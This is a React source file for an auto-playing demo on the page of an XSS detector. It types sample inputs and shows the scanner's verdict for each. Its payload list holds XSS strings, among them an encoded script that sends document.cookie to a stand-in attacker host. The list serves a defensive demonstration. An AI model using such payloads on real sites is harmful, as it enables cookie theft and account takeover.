import { useEffect, useState } from "react";
import { post } from "../api.js";
import { LEVEL_LABEL, verdictText } from "../format.js";
import { useReducedMotion } from "../lib/useReducedMotion.js";

export const DEMO_PAYLOADS = [
  "<img src=x onerror=alert(document.cookie)>",
  "%3Cscript%3Efetch('//evil.example/?c='+document.cookie)%3C/script%3E",
  "\"><svg/onload=alert(1)>",
  "Great post - thanks for sharing! 5 < 10.",
];

// An auto-playing demo on the real detector: it types a payload, scans it through POST /scan and shows the
// verdict, then moves on. It pauses on hover, on focus, and with the button (moving content must be
// pausable); under reduced motion nothing animates and the first payload is shown with its result.
export function HeroDemo({ payloads = DEMO_PAYLOADS, typeMs = 35, holdMs = 2500 }) {
  const reduced = useReducedMotion();
  const [index, setIndex] = useState(0);
  const [typed, setTyped] = useState(0);
  const [phase, setPhase] = useState("typing"); // typing -> scanning -> showing -> next payload
  const [paused, setPaused] = useState(false);
  const [hovered, setHovered] = useState(false);
  const [focused, setFocused] = useState(false);
  const [results, setResults] = useState({}); // payload index -> scan result | "error"
  const text = payloads[index];
  const halted = paused || hovered || focused;

  useEffect(() => {
    if (reduced || phase !== "typing" || halted) return undefined;
    const timer = setTimeout(() => {
      if (typed < text.length) setTyped(typed + 1);
      else setPhase("scanning");
    }, typeMs);
    return () => clearTimeout(timer);
  }, [reduced, phase, typed, text, halted, typeMs]);

  // Scan each payload once; the result is cached, so cycling round again costs no requests.
  useEffect(() => {
    if (!(reduced || phase === "scanning") || results[index] !== undefined) return undefined;
    const controller = new AbortController();
    const settle = (value) => { if (!controller.signal.aborted) setResults((r) => ({ ...r, [index]: value })); };
    Promise.resolve(post("/scan", { text }, controller.signal))
      .then(({ ok, data }) => settle(ok && data && typeof data.score === "number" ? data : "error"))
      .catch(() => settle("error"));
    return () => controller.abort();
  }, [reduced, phase, index]); // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    if (phase === "scanning" && results[index] !== undefined) setPhase("showing");
  }, [phase, results, index]);

  useEffect(() => {
    if (reduced || phase !== "showing" || halted) return undefined;
    const timer = setTimeout(() => {
      setIndex((index + 1) % payloads.length);
      setTyped(0);
      setPhase("typing");
    }, holdMs);
    return () => clearTimeout(timer);
  }, [reduced, phase, halted, index, holdMs, payloads.length]);

  const shownText = reduced ? text : text.slice(0, typed);
  const result = results[index];
  let verdict = null;
  if (reduced || phase === "showing") {
    if (result === "error") {
      verdict = <p className="muted">Live results unavailable - is the server running?</p>;
    } else if (result) {
      verdict = (
        <>
          <div className="demo-verdict">
            <span className={`chip level-${result.level}`}>{LEVEL_LABEL[result.level] || result.level}</span>
            <span className="muted">{`score ${result.score}/100`}</span>
            <strong>{verdictText(result)}</strong>
          </div>
          <p className="muted">
            {result.findings.length ? `Found: ${result.findings.slice(0, 2).map((f) => f.name).join(", ")}` : "No rules matched."}
          </p>
        </>
      );
    } else {
      verdict = <p className="muted">Scanning…</p>;
    }
  } else if (phase === "scanning") {
    verdict = <p className="muted">Scanning…</p>;
  }

  return (
    <div
      className="card demo"
      role="group"
      aria-label="Live detection demo"
      onMouseEnter={() => setHovered(true)}
      onMouseLeave={() => setHovered(false)}
      onFocus={() => setFocused(true)}
      onBlur={(event) => { if (!event.currentTarget.contains(event.relatedTarget)) setFocused(false); }}
    >
      <div className="demo-head">
        <span className="muted">Try it: a payload arrives</span>
        {reduced ? null : (
          <button type="button" className="ghost" onClick={() => setPaused(!paused)}>{paused ? "Play demo" : "Pause demo"}</button>
        )}
      </div>
      <div className="demo-input">
        <code><span className="demo-typed">{shownText}</span><span className="caret" aria-hidden="true" /></code>
      </div>
      <div className="demo-result" aria-live="off">{verdict}</div>
    </div>
  );
}
